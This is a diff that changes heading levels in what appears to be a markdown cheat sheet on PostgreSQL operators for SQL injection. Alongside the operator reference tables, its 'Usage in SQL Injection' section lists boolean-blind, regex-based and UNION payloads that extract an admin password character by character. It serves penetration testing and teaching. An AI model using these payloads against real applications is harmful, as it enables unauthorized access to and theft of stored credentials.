@@ -7,11 +7,9 @@ tags: ["operators", "comparison", "logical", "reference"]
 lastUpdated: 2025-12-16
 ---
 
-## Operators
-
 Understanding PostgreSQL operators is essential for crafting effective SQL injection payloads. This reference covers the most useful operators for SQL injection techniques.
 
-### Comparison Operators
+## Comparison Operators
 
 | Operator               | Description                | Example                                                    |
 | ---------------------- | -------------------------- | ---------------------------------------------------------- |
@@ -35,7 +33,7 @@ Understanding PostgreSQL operators is essential for crafting effective SQL injec
 | `!~*`                  | Case-insensitive not match | `SELECT * FROM users WHERE name !~* '^A'`                  |
 | `IN`                   | In set                     | `SELECT * FROM users WHERE id IN (1,2,3)`                  |
 
-### Logical Operators
+## Logical Operators
 
 | Operator | Description | Example                                                |
 | -------- | ----------- | ------------------------------------------------------ |
@@ -45,7 +43,7 @@ Understanding PostgreSQL operators is essential for crafting effective SQL injec
 
 **Important**: PostgreSQL uses `||` for string/array concatenation and `&&` for array overlap—not for logical operations (use `AND`/`OR` instead). This differs from some databases but both PostgreSQL and MySQL require explicit `AND`/`OR` keywords for logical operations.
 
-### String Operators
+## String Operators
 
 | Operator      | Description                         | Example                                                  |
 | ------------- | ----------------------------------- | -------------------------------------------------------- |
@@ -53,7 +51,7 @@ Understanding PostgreSQL operators is essential for crafting effective SQL injec
 | `CONCAT()`    | Concatenate strings                 | `SELECT CONCAT(first_name, ' ', last_name) FROM users`   |
 | `CONCAT_WS()` | Concatenation with separator (9.1+) | `SELECT CONCAT_WS('-', 'a', 'b', 'c')` (returns 'a-b-c') |
 
-### Mathematical Operators
+## Mathematical Operators
 
 | Operator | Description    | Example                      |
 | -------- | -------------- | ---------------------------- |
@@ -67,7 +65,7 @@ Understanding PostgreSQL operators is essential for crafting effective SQL injec
 | `\|\|/`  | Cube root      | `SELECT \|\|/27` (returns 3) |
 | `@`      | Absolute value | `SELECT @ -5` (returns 5)    |
 
-### Bitwise Operators
+## Bitwise Operators
 
 | Operator | Description | Example                     |
 | -------- | ----------- | --------------------------- |
@@ -78,7 +76,7 @@ Understanding PostgreSQL operators is essential for crafting effective SQL injec
 | `>>`     | Right shift | `SELECT 4 >> 2` (returns 1) |
 | `~`      | Bitwise NOT | `SELECT ~1` (returns -2)    |
 
-### Type Cast Operator
+## Type Cast Operator
 
 PostgreSQL has a unique cast operator `::`:
 
@@ -89,7 +87,7 @@ SELECT '2025-01-01'::date;  -- Cast string to date
 SELECT 1::boolean;          -- Cast to boolean (true)
 ```
 
-### Array Operators
+## Array Operators
 
 | Operator | Description         | Example                         |
 | -------- | ------------------- | ------------------------------- |
@@ -101,7 +99,7 @@ SELECT 1::boolean;          -- Cast to boolean (true)
 
 **Note:** PostgreSQL arrays are 1-based, so `[1]` returns the first element, not the second.
 
-### JSON/JSONB Operators
+## JSON/JSONB Operators
 
 | Operator | Description              | Example                                |
 | -------- | ------------------------ | -------------------------------------- |
@@ -112,9 +110,9 @@ SELECT 1::boolean;          -- Cast to boolean (true)
 | `@>`     | Contains (JSONB)         | `'{"a":1}'::jsonb @> '{"a":1}'::jsonb` |
 | `?`      | Key exists               | `'{"a":1}'::jsonb ? 'a'`               |
 
-### Usage in SQL Injection
+## Usage in SQL Injection
 
-#### Boolean-Based Blind Injection
+### Boolean-Based Blind Injection
 
 ```sql
 -- Testing if admin exists
@@ -124,7 +122,7 @@ SELECT 1::boolean;          -- Cast to boolean (true)
 ' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97 --
 ```
 
-#### Using String Concatenation
+### Using String Concatenation
 
 ```sql
 -- PostgreSQL uses || for concatenation (NOT logical OR)
@@ -134,7 +132,7 @@ SELECT 1::boolean;          -- Cast to boolean (true)
 ' UNION SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110) --
 ```
 
-#### Regex-Based Injection
+### Regex-Based Injection
 
 ```sql
 -- Using POSIX regex for blind extraction
@@ -144,7 +142,7 @@ SELECT 1::boolean;          -- Cast to boolean (true)
 ' OR (SELECT username FROM users LIMIT 1) ~* '^ADMIN' --
 ```
 
-#### Type Cast for Database Detection
+### Type Cast for Database Detection
 
 ```sql
 -- PostgreSQL-specific :: cast syntax
@@ -153,7 +151,7 @@ SELECT 1::boolean;          -- Cast to boolean (true)
 -- Will fail on MySQL/MSSQL, confirming PostgreSQL
 ```
 
-### Operator Precedence in PostgreSQL
+## Operator Precedence in PostgreSQL
 
 From highest to lowest (per [PostgreSQL documentation](https://www.postgresql.org/docs/current/sql-syntax-lexical.html#SQL-PRECEDENCE)):
 
@@ -174,7 +172,7 @@ From highest to lowest (per [PostgreSQL documentation](https://www.postgresql.or
 15. `AND`
 16. `OR`
 
-### Truth Table for Logical Operators
+## Truth Table for Logical Operators
 
 | Expr1 | Expr2 | AND   | OR    |
 | ----- | ----- | ----- | ----- |
@@ -188,7 +186,7 @@ From highest to lowest (per [PostgreSQL documentation](https://www.postgresql.or
 | NULL  | FALSE | FALSE | NULL  |
 | NULL  | NULL  | NULL  | NULL  |
 
-### Key Differences from MySQL
+## Key Differences from MySQL
 
 1. `||` is string concatenation, NOT logical OR
 2. `#` is bitwise XOR (MySQL uses `^`)
